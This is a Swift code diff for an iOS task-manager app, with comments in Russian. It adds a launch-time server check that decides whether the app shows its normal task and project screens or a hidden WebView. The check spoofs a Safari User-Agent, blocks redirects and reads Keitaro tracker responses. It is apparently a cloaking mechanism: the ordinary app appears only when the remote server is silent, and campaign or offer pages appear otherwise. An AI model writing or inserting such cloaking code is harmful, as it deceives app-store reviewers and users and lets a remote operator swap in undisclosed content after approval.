@@ -9,7 +9,9 @@ import SwiftUI
 
 struct ContentView: View {
     @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
-    @StateObject private var appViewModel = AppViewModel()
+    @AppStorage("isBlock") var isBlock: Bool = true
+    
+    @State var isFetched: Bool = false
     
     @ObservedObject var taskService: TaskService
     @ObservedObject var projectService: ProjectService
@@ -17,16 +19,21 @@ struct ContentView: View {
     
     var body: some View {
         ZStack {
-            if appViewModel.isCheckingAttribution {
-                // Показываем загрузку пока проверяем атрибуцию AppsFlyer
+            if isFetched == false {
+                // Показываем загрузку пока проверяем сервер
                 LoadingView()
-            } else if appViewModel.shouldShowWebView, let campaignURL = appViewModel.campaignURL {
-                // Неорганическая установка - показываем WebView с кампанией
-                CampaignWebView(campaignURL: campaignURL)
-            } else {
-                // Органическая установка - показываем обычное приложение
-                normalAppFlow
+            } else if isFetched == true {
+                if isBlock == false {
+                    // Сервер ответил 200 или 3xx - показываем WebView
+                    WebSystem()
+                } else {
+                    // Сервер недоступен или вернул ошибку - показываем обычное приложение
+                    normalAppFlow
+                }
             }
+        }
+        .onAppear {
+            makeServerRequest()
         }
     }
     
@@ -75,6 +82,101 @@ struct ContentView: View {
             }
         }
     }
+    
+    private func makeServerRequest() {
+        
+        let dataManager = DataManagers()
+        
+        guard let url = URL(string: dataManager.server) else {
+            self.isBlock = false
+            self.isFetched = true
+            return
+        }
+        
+        print("🚀 Making request to: \(url.absoluteString)")
+        print("🏠 Host: \(url.host ?? "unknown")")
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "GET"
+        request.timeoutInterval = 5.0
+        
+        // Добавляем заголовки для имитации браузера
+        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
+        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
+        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
+        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
+        
+        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
+        
+        // Создаем URLSession без автоматических редиректов
+        let config = URLSessionConfiguration.default
+        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
+        
+        session.dataTask(with: request) { data, response, error in
+            
+            DispatchQueue.main.async {
+                
+                // Если есть любая ошибка (включая SSL) - блокируем
+                if let error = error {
+                    print("❌ Network error: \(error.localizedDescription)")
+                    print("Server unavailable, showing block")
+                    self.isBlock = true
+                    self.isFetched = true
+                    return
+                }
+                
+                // Если получили ответ от сервера
+                if let httpResponse = response as? HTTPURLResponse {
+                    
+                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
+                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
+                    
+                    // Логируем тело ответа для диагностики
+                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
+                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
+                    }
+                    
+                    if httpResponse.statusCode == 200 {
+                        // Проверяем, есть ли контент в ответе
+                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
+                        let hasContent = data?.count ?? 0 > 0
+                        
+                        if contentLength == "0" || !hasContent {
+                            // Пустой ответ = "do nothing" от Keitaro
+                            print("🚫 Empty response (do nothing): Showing block")
+                            self.isBlock = true
+                            self.isFetched = true
+                        } else {
+                            // Есть контент = успех
+                            print("✅ Success with content: Showing WebView")
+                            self.isBlock = false
+                            self.isFetched = true
+                        }
+                        
+                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
+                        // Редиректы = успех (есть оффер)
+                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
+                        self.isBlock = false
+                        self.isFetched = true
+                        
+                    } else {
+                        // 404, 403, 500 и т.д. - блокируем
+                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
+                        self.isBlock = true
+                        self.isFetched = true
+                    }
+                    
+                } else {
+                    
+                    // Нет HTTP ответа - блокируем
+                    print("❌ No HTTP response: Showing block")
+                    self.isBlock = true
+                    self.isFetched = true
+                }
+            }
+            
+        }.resume()
+    }
 }
 
 struct LoadingView: View {
@@ -93,5 +195,17 @@ struct LoadingView: View {
                     .foregroundColor(Color(hex: "#f7f7f7"))
             }
         }
+    }
+}
+
+// Класс для отключения автоматических редиректов
+class RedirectHandler: NSObject, URLSessionTaskDelegate {
+    
+    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
+        
+        print("🔄 Redirect blocked: \(response.statusCode) -> \(request.url?.absoluteString ?? "unknown")")
+        
+        // Возвращаем nil, чтобы НЕ следовать редиректу
+        completionHandler(nil)
     }
 }
